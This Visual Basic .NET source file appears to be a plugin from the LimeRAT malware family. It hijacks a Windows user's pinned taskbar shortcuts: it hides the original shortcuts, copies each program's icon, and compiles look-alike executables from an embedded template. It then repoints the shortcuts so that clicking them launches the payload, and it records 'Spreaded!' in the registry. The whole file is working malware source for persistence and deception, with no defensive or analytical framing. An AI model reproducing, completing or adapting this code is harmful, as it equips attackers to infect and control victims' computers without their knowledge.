Imports System.Drawing
Imports System.Drawing.IconLib
Imports System.IO.Directory, System.IO, System.Environment, System.Threading.Thread, System.IO.Path, System.Text
Imports Microsoft.Win32
'credit: N A P O L E O N

Public Class Main
    Public Shared Assemb As String = "Lime_W"
    Public Shared I As Boolean = True
    Public Shared HWID As String
    Public Shared Target As String = GetFolderPath(26) & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
    Public Shared ShortcutDIR As String = GetFolderPath(26) & "\Lime\"
    Public Shared EXEDIR As String = GetFolderPath(26) & "\Lime\EXE\"
    Public Shared ICODIR As String = GetFolderPath(26) & "\Lime\ICO\"
    Public Shared FULLPATH As String
    Public Shared R As New Random
    Public Shared BL As Boolean = False

    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

        FULLPATH = FP
        HWID = HW
        're:
        Sleep(60000)

        Try
            If Not File.Exists(Windows.Forms.Application.StartupPath + "\IconLib.dll") AndAlso Not File.Exists(Windows.Forms.Application.StartupPath + "\Interop.Shell32.dll") Then
                File.WriteAllBytes(Windows.Forms.Application.StartupPath + "\IconLib.dll", My.Resources.IconLib)
                File.WriteAllBytes(Windows.Forms.Application.StartupPath + "\Interop.Shell32.dll", My.Resources.Interop_Shell32)
            End If
        Catch ex As Exception
        End Try

        Try
            For Each Shourtcuts In GetFiles(Target)
                If Shourtcuts.EndsWith(".lnk").ToString.ToLower Then
                    If Not Directory.Exists(ShortcutDIR) Then
                        Directory.CreateDirectory(ShortcutDIR)
                    End If
                    If Not Directory.Exists(EXEDIR) Then
                        Directory.CreateDirectory(EXEDIR)
                    End If
                    If Not Directory.Exists(ICODIR) Then
                        Directory.CreateDirectory(ICODIR)
                    End If
                    If Not File.Exists(ShortcutDIR & GetFileName(Shourtcuts)) AndAlso GetFileName(Shourtcuts) <> "File Explorer.lnk" Then
                        '  If IsValid(GetFileName(Shourtcuts)) = False Then
                        IC(GetFileNameWithoutExtension(Shourtcuts), GetFullPath(Shourtcuts))
                            File.Move(Shourtcuts, ShortcutDIR & GetFileName(Shourtcuts))
                            CS(GetFileName(Shourtcuts), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe")
                            Compile(My.Resources.Code.Replace("%CC%", Randomz(6)).Replace("%A%", FULLPATH).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
                            If I = True Then
                                STV("USB", "Spreaded!")
                                I = False
                            End If
                        '    End If
                    End If
                End If
            Next
            Exit Sub
            'GoTo re
        Catch ex As Exception
            Diagnostics.Debug.WriteLine("RC " + ex.Message)
        End Try
    End Sub
    Public Shared Function CS(ByVal Path As String, EXE As String)
        Dim CSO
        CSO = CreateObject("WScript.Shell").CreateShortcut(Target & "\" & Path)
        CSO.TargetPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings(EXE)
        CSO.WindowStyle = 4
        CSO.Save()
    End Function
    Public Shared Sub IC(ByVal EX As String, P As String)
        On Error Resume Next
        Dim GP = GetLnkTarget(P)
        Dim I1 As Icon = Icon.ExtractAssociatedIcon(GP), MI As New MultiIcon(), SI As SingleIcon = MI.Add(GetFileName(GP))
        SI.CreateFrom(I1.ToBitmap(), IconOutputFormat.Vista)
        SI.Save(ICODIR & EX.Replace(" ", String.Empty) & ".ico")
    End Sub
    Public Shared Function GetLnkTarget(lnkPath As String) As String
        Try
            Dim shell = CreateObject("WScript.Shell")
            Dim path = shell.CreateShortcut(lnkPath).TargetPath
            Return path
        Catch ex As Exception
            Diagnostics.Debug.WriteLine("GETLINK " + ex.Message)
        End Try
    End Function
    Public Shared Function Randomz(ByVal L As Integer)
        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim sb As New System.Text.StringBuilder()
        Dim rand As New Random()
        For i As Integer = 1 To L
            Dim idx As Integer = rand.Next(0, validchars.Length)
            Dim randomChar As Char = validchars(idx)
            sb.Append(randomChar)
        Next i
        Dim randomString = sb.ToString()
        Return randomString
    End Function
    Public Shared Function Compile(ByVal Source As String, ByVal Out As String, ByVal icon As String)
        Dim ProviderOptions As New Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")
        Dim CP = New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim P As New CodeDom.Compiler.CompilerParameters
        Dim s As New StringBuilder()
        s.Append(" /target:winexe")
        s.Append(" /platform:x86")
        s.Append(" /optimize+")
        s.Append(" /win32icon:" & ICODIR & icon & ".ico")
        P.GenerateExecutable = True
        P.OutputAssembly = Out
        P.CompilerOptions += s.ToString()
        P.IncludeDebugInformation = False
        P.ReferencedAssemblies.Add("System.Windows.Forms.Dll")
        Dim Results1 = CP.CompileAssemblyFromSource(P, Source)
        For Each uii As CodeDom.Compiler.CompilerError In Results1.Errors
            Return uii.ToString
        Next
    End Function
    Private Shared Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & HWID).GetValue(n, "")
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Private Shared Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Shared Function IsValid(ByVal P As String) As Boolean
        Try
            Dim Info As FileVersionInfo = FileVersionInfo.GetVersionInfo(P)
            If Info.LegalCopyright.Contains(Assemb) Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function
End Class